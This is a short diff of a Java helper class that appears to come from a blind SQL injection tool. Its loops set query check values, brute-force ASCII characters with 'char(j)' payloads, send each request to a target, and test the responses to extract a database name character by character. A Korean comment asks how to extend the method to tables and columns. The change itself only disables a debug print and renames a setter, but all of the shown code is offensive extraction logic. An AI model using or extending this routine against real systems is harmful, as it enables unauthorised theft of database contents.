@@ -45,7 +45,7 @@ public class ResultHelper {
 		for(int i=0; i < until; i++){
 			qc.setCheckVal(i+"");
 			HttpBullet bullet = factory.getHttpBullet(qc, uc);
-			System.out.println(bullet.getUrl());
+			//System.out.println(bullet.getUrl());
 			String res = httpSoldier.send(bullet);
 			//System.out.println(res);
 			if(decider.isSuccess(res, match)){
@@ -60,7 +60,7 @@ public class ResultHelper {
 		String content = "";
 		for(int i=0; i < targetContentLength ; i++){
 			for(int j=33; j < 127; j++){ //(search ascii 33~126)
-				qc.setDbIndex(i+1);
+				qc.setDbNameIndex(i+1);  //이 것을 테이블이나 칼럼일 경우 어떻게 할 것인지...
 				qc.setCheckVal("char("+j+")");
 				HttpBullet bullet = factory.getHttpBullet(qc, uc);
 				String res = httpSoldier.send(bullet);
